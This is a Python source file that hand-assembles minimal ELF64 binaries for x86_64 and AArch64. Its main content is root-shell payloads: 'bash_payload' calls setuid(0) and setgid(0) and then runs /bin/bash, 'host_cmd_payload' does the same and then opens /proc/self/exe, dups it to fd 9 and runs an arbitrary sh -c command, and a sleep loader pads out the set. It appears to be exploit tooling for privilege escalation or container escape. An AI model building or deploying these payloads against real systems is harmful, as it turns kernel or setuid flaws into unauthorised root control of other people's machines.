#!/usr/bin/env python3
import platform
import struct


EM_X86_64 = 0x3E
EM_AARCH64 = 0xB7


def normalize_arch(arch):
    machine = arch.lower()
    if machine in ("x86_64", "amd64"):
        return "x86_64"
    if machine in ("aarch64", "arm64"):
        return "aarch64"
    raise SystemExit(f"unsupported architecture: {arch}")


def native_arch():
    return normalize_arch(platform.machine())


def elf64(machine, code, *, et_dyn=False):
    off = 0x78
    base = 0 if et_dyn else 0x400000
    size = off + len(code)

    eh = bytearray(0x40)
    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into(
        "<HHIQQQIHHHHHH",
        eh,
        16,
        3 if et_dyn else 2,
        machine,
        1,
        base + off,
        0x40,
        0,
        0,
        0x40,
        0x38,
        1,
        0,
        0,
        0,
    )

    ph = bytearray(0x38)
    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, base, base, size, size, 0x1000)
    return bytes(eh + ph + code)


class X86_64:
    machine = EM_X86_64

    def __init__(self):
        self.code = bytearray()
        self.fixups = []

    def emit(self, data):
        self.code.extend(data)

    def lea(self, modrm, label):
        pos = len(self.code)
        self.emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
        self.fixups.append((pos + 3, label, pos + 7))

    def finish(self, labels, *, et_dyn=False):
        for at, label, next_ip in self.fixups:
            self.code[at : at + 4] = struct.pack("<i", labels[label] - next_ip)
        return elf64(self.machine, self.code, et_dyn=et_dyn)


class AArch64:
    machine = EM_AARCH64

    def __init__(self):
        self.code = bytearray()
        self.adr_fixups = []

    def insn(self, word):
        self.code.extend(struct.pack("<I", word))

    def movz(self, rd, imm):
        self.insn(0xD2800000 | ((imm & 0xFFFF) << 5) | rd)

    def movn(self, rd, imm):
        self.insn(0x92800000 | ((imm & 0xFFFF) << 5) | rd)

    def mov_sp(self, rd):
        self.insn(0x91000000 | (31 << 5) | rd)

    def adr(self, rd, label):
        pos = len(self.code)
        self.insn(0x10000000 | rd)
        self.adr_fixups.append((pos, rd, label))

    def svc(self):
        self.insn(0xD4000001)

    def sub_sp(self, imm):
        self.insn(0xD1000000 | ((imm & 0xFFF) << 10) | (31 << 5) | 31)

    def str_x(self, rt, offset):
        self.insn(0xF9000000 | ((offset // 8) << 10) | (31 << 5) | rt)

    def setuid0(self):
        self.movz(0, 0)
        self.movz(8, 146)
        self.svc()

    def setgid0(self):
        self.movz(0, 0)
        self.movz(8, 144)
        self.svc()

    def exit(self, status):
        self.movz(0, status)
        self.movz(8, 93)
        self.svc()

    def execve(self, path_label, argv_labels):
        self.adr(0, path_label)
        regs = []
        for reg, label in zip((3, 4, 5, 6), argv_labels[1:]):
            self.adr(reg, label)
            regs.append(reg)

        self.sub_sp(8 * (len(argv_labels) + 1))
        self.str_x(31, 8 * len(argv_labels))
        for index, reg in enumerate(reversed(regs), start=1):
            self.str_x(reg, 8 * (len(argv_labels) - index))
        self.str_x(0, 0)
        self.mov_sp(1)
        self.movz(2, 0)
        self.movz(8, 221)
        self.svc()

    def finish(self, labels, *, et_dyn=False):
        for pos, rd, label in self.adr_fixups:
            imm = labels[label] - pos
            if imm < -(1 << 20) or imm >= (1 << 20):
                raise SystemExit(f"ADR target out of range: {label}")
            immlo = imm & 0x3
            immhi = (imm >> 2) & 0x7FFFF
            word = 0x10000000 | (immlo << 29) | (immhi << 5) | rd
            self.code[pos : pos + 4] = struct.pack("<I", word)
        return elf64(self.machine, self.code, et_dyn=et_dyn)


def bash_payload(arch=None):
    arch = normalize_arch(arch or native_arch())
    if arch == "x86_64":
        p = X86_64()
        p.emit(b"\x31\xff\x6a\x69\x58\x0f\x05")
        p.emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")
        p.lea(0x3D, "bash")
        p.emit(b"\x31\xd2\x52\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
        p.emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")
        labels = {"bash": len(p.code)}
        p.emit(b"/bin/bash\0")
        return p.finish(labels)

    if arch == "aarch64":
        p = AArch64()
        p.setuid0()
        p.setgid0()
        p.execve("bash", ["bash"])
        p.exit(127)
        labels = {"bash": len(p.code)}
        p.code.extend(b"/bin/bash\0")
        return p.finish(labels)

    raise SystemExit(f"unsupported payload architecture: {arch}")


def host_cmd_payload(cmd, arch=None):
    arch = normalize_arch(arch or native_arch())
    if arch == "x86_64":
        p = X86_64()
        p.emit(b"\x31\xff\x6a\x69\x58\x0f\x05")  # setuid(0)
        p.emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")  # setgid(0)
        p.lea(0x3D, "self_exe")
        p.emit(b"\x31\xf6\x31\xd2\x6a\x02\x58\x0f\x05")  # open("/proc/self/exe", O_RDONLY)
        p.emit(b"\x48\x89\xc7\x6a\x09\x5e\x6a\x21\x58\x0f\x05")  # dup2(fd, 9)
        p.lea(0x3D, "sh")
        p.lea(0x1D, "dash_c")
        p.lea(0x0D, "cmd")
        p.emit(b"\x31\xd2\x52\x51\x53\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
        p.emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")
        labels = {"sh": len(p.code)}
        p.emit(b"/bin/sh\0")
        labels["dash_c"] = len(p.code)
        p.emit(b"-c\0")
        labels["self_exe"] = len(p.code)
        p.emit(b"/proc/self/exe\0")
        labels["cmd"] = len(p.code)
        p.emit(cmd.encode() + b"\0")
        return p.finish(labels)

    if arch == "aarch64":
        p = AArch64()
        p.setuid0()
        p.setgid0()
        p.movn(0, 99)  # AT_FDCWD (-100)
        p.adr(1, "self_exe")
        p.movz(2, 0)
        p.movz(3, 0)
        p.movz(8, 56)  # openat
        p.svc()
        p.movz(1, 9)
        p.movz(2, 0)
        p.movz(8, 24)  # dup3(fd, 9, 0)
        p.svc()
        p.execve("sh", ["sh", "dash_c", "cmd"])
        p.exit(127)
        labels = {"sh": len(p.code)}
        p.code.extend(b"/bin/sh\0")
        labels["dash_c"] = len(p.code)
        p.code.extend(b"-c\0")
        labels["self_exe"] = len(p.code)
        p.code.extend(b"/proc/self/exe\0")
        labels["cmd"] = len(p.code)
        p.code.extend(cmd.encode() + b"\0")
        return p.finish(labels)

    raise SystemExit(f"unsupported payload architecture: {arch}")


def sleep_loader_payload(seconds, arch=None):
    arch = normalize_arch(arch or native_arch())
    if arch == "x86_64":
        p = X86_64()
        p.emit(b"\x48\xc7\xc0\x23\0\0\0")  # mov rax, SYS_nanosleep
        p.lea(0x3D, "timespec")
        p.emit(b"\x31\xf6")  # xor esi, esi
        p.emit(b"\x0f\x05")  # syscall
        p.emit(b"\x6a\x3c\x58")  # push 60; pop rax
        p.emit(b"\x6a\x7f\x5f")  # push 127; pop rdi
        p.emit(b"\x0f\x05")  # syscall
        labels = {"timespec": len(p.code)}
        p.emit(struct.pack("<QQ", seconds, 0))
        return p.finish(labels, et_dyn=True)

    if arch == "aarch64":
        p = AArch64()
        p.adr(0, "timespec")
        p.movz(1, 0)
        p.movz(8, 101)  # nanosleep
        p.svc()
        p.exit(127)
        while len(p.code) % 8:
            p.insn(0xD503201F)  # nop
        labels = {"timespec": len(p.code)}
        p.code.extend(struct.pack("<QQ", seconds, 0))
        return p.finish(labels, et_dyn=True)

    raise SystemExit(f"unsupported payload architecture: {arch}")
